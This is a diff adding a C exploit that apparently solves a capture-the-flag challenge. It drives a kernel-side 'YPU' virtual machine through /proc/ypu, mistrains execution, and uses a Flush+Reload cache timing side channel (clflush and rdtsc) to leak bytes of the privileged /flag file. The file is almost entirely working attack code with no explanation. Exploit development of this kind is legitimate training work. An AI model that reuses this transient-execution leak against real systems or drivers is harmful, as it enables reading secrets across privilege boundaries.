@@ -1,0 +1,190 @@
+#include <stdio.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <semaphore.h>
+#include <x86intrin.h>
+
+#include "vm_instr.h"
+
+#define PAGE_SIZE 0x1000
+#define MEMLIM 0x80
+
+#define ZERO_OUT 0x555059
+#define FILENAME "/flag"
+#define FLAG_PREFIX "pwm.college"
+#define FLAGLEN  59 
+#define START 32
+#define END 0x7f
+
+#define THRESHOLD 200
+#define TRAIN_FOR 4 // :)
+
+struct instruction* output;
+
+struct __shmem {
+    uint32_t zero_out;
+    uint32_t i;
+    char     __pad;
+    struct instruction code[0xff];
+}* shmem = NULL;
+
+struct page_data {
+    char data[PAGE_SIZE];
+}* page_ptr = NULL;
+
+static int dev_fd;
+
+
+#define COMM { \
+    int __rc__ = ioctl(dev_fd, 0x539, 0); \
+/*    fprintf(stderr, "rc: %s\t", (__rc__) ? "true" : "false");*/ \
+;}
+
+#define for_each_char(var) for (int var = START; var < END; var++)
+
+size_t measure(void* ptr)
+{
+    register void* reg_ptr asm("rdi") = ptr;
+    size_t start, end;
+
+    start = __rdtsc();
+    _mm_lfence();
+    asm volatile("mov r8, qword ptr [%0]"
+                :
+                : "r" (reg_ptr)
+                : "r8"
+                );
+    _mm_lfence();
+    end   = __rdtsc();
+
+    return end - start;
+}
+
+void flush_pages(int start, int end, size_t step, void* mem)
+{
+    for (int i = start; i < end; i++)
+        _mm_clflush(mem + step * i);
+}
+
+
+void init_yan(struct __shmem* ptr)
+{
+    ptr->i = (uint32_t) &((struct __shmem*)0)->code / 3 - 1; 
+    ptr->zero_out = ZERO_OUT;
+    COMM
+
+    ptr->zero_out = 0;
+}
+
+void train_exec()
+{
+    for (int i = 0; i < TRAIN_FOR; i++)
+    {
+        interpret_imm(A, 0); // addr = 0 
+        interpret_imm(B, 1); // val  = 1
+        interpret_stm(A, B); // *addr = val
+        interpret_sys(EXEC, D);
+
+        // val << 0xC => at 0x1000 + state->code has to be ZERO_OUT
+        *((uint32_t*)&page_ptr[1]) = ZERO_OUT; 
+        COMM
+
+        init_yan(shmem);
+        COMM
+    }
+}
+
+int main(int argc, char** argv)
+{
+    char flag[FLAGLEN] = {0};
+    size_t threshold = THRESHOLD;
+
+    dev_fd = open("/proc/ypu", O_RDWR);
+    if (dev_fd < 0) {
+        perror("open");
+        exit(1);
+    }
+
+    shmem = mmap((void*)0x10000, 0x100000,
+                 PROT_WRITE | PROT_READ,
+                 MAP_SHARED | MAP_POPULATE,
+                 dev_fd, 0);
+    if (shmem == MAP_FAILED) {
+        perror("mmap");
+        exit(1);
+    }
+    page_ptr = (struct page_data*)shmem;
+    output = shmem->code;
+
+    init_yan(shmem);
+
+    // filename to mem
+    for (int i = 0; i < sizeof FILENAME; i++) {
+        interpret_imm(D, FILENAME[i]);
+        interpret_stk(0, D);
+    }
+
+    // open filename
+    interpret_imm(A, 1);
+    interpret_imm(B, O_RDWR);
+    interpret_imm(C, 0);
+    interpret_sys(OPEN, D);
+
+    // read from the open file to mem[MEMLIM]
+    interpret_imm(A, 0);
+    interpret_imm(B, MEMLIM);
+    interpret_imm(C, FLAGLEN);
+    interpret_sys(READ_MEM, D);
+
+    COMM
+
+    // exploit
+    for (int i = 0; i < 1; i++) 
+    {
+        train_exec();
+        interpret_imm(A, 0);
+        interpret_imm(B, MEMLIM + i);
+        interpret_ldm(B, B);
+        interpret_stm(A, B);
+
+        COMM
+        
+        interpret_sys(EXEC, D);
+        flush_pages(START, END, PAGE_SIZE * 2, page_ptr);
+
+        COMM
+
+        size_t hits[END] = {0};
+        for_each_char(j)
+        {
+            volatile int mix_j = (((j * j) * 2));
+            mix_j = ( mix_j / j ) ^ 1;
+            mix_j ^= 1;
+            mix_j /= 2;
+
+            size_t time = measure((char*) page_ptr + PAGE_SIZE*2 * (j+1));
+            if (time <= threshold)
+                hits[mix_j] += 1;
+        }
+
+        size_t max_hits = 0;
+        int ch = 0;
+        for_each_char(j)
+        {
+            size_t hit = hits[j];
+            if (hit)
+                printf("%2d/%3d (%c) - hits: %ld\n", i, j, j, hit);
+            if (hit && max_hits < hit) {
+                max_hits = hit;
+                ch = j;
+            }
+        }
+        printf("p is %ld hits\n", hits['p']);
+    }
+}
